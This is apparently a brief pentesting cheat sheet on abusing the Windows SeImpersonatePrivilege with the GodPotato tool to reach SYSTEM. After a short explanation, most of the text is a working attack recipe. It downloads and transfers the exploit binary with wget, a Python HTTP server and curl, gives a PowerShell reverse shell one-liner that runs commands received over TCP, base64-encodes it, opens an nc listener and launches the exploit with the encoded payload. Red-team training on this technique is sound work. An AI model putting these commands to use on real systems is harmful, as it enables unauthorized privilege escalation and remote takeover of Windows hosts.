# SeImpersonatePrivilege
SeImpersonatePrivilege is a Windows security privilege that allows a process to impersonate other users, including high-privileged accounts like SYSTEM, Administrator, or even Domain Admins.

Think of it as putting on someone else's security badge. If you have this privilege, when another process (running as a different user) connects to your process, you can temporarily "wear their security badge" and perform actions with their level of access.

# Steps
1. Download the GodPotato-NET4.exe
2. create a powershell base64 formate encoded code
3. Start listner and Run the GodPotato-NET4.exe


# Download and Transfer it
```language
wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe
python3 -m http.server 80

curl http://ip:80/GodPotato-NET4.exe -o gp.exe
```
# Create a rev.ps1 file and convert to the powershell formate
Please change the ip here 
```language
$c=New-Object System.Net.Sockets.TCPClient("127.0.0.1",9001);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){;$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+"PS "+"> ";$sby=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()};$c.Close()
```
```language
cat rev.ps1 | iconv -t utf-16le | base64 -w0; echo 
```
# start listner
```language
rlwrap nc -lvnp 9001
.\gp.exe -cmd "powershell <encoded code here> "
```
